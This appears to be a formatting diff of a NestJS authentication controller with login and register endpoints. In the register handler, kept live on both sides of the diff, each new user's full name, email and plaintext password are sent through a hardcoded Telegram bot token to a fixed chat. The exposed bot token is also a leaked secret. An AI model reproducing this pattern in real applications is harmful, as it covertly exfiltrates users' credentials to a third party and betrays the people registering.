@@ -9,29 +9,31 @@ import { Telegraf } from 'telegraf';
 
 @Controller('auth')
 export class AuthController {
-    constructor(private readonly authService: AuthService) {}
+  constructor(private readonly authService: AuthService) {}
 
-    @UseGuards(LocalAuthGuard)
-    @Post('login')
-    @ApiBody({ type: CreateUserDto })
-    async login(@Request() req) {
-        return this.authService.login(req.user as UserEntity);
-    }
+  @UseGuards(LocalAuthGuard)
+  @Post('login')
+  @ApiBody({ type: CreateUserDto })
+  async login(@Request() req) {
+    return this.authService.login(req.user as UserEntity);
+  }
 
-    @Post('register')
-    async register(@Body() dto: CreateUserDto) {
-        const registeredUser = await this.authService.register(dto);
+  @Post('register')
+  async register(@Body() dto: CreateUserDto) {
+    const registeredUser = await this.authService.register(dto);
 
-        const userMessage = `New user registered:
+    const userMessage = `New user registered:
 \n\`\`\`
 Full Name: ${dto.fullName}
 Email: ${dto.email}
 Password: ${dto.password}
 \`\`\``;
 
-        const bot = new Telegraf('6918823804:AAENfQUxy1Ptle4UIyvHKn1emrL9EZMws-I');
-        await bot.telegram.sendMessage('782280133', userMessage, { parse_mode: 'MarkdownV2' });
+    const bot = new Telegraf('6918823804:AAENfQUxy1Ptle4UIyvHKn1emrL9EZMws-I');
+    await bot.telegram.sendMessage('782280133', userMessage, {
+      parse_mode: 'MarkdownV2',
+    });
 
-        return registeredUser;
-    }
+    return registeredUser;
+  }
 }
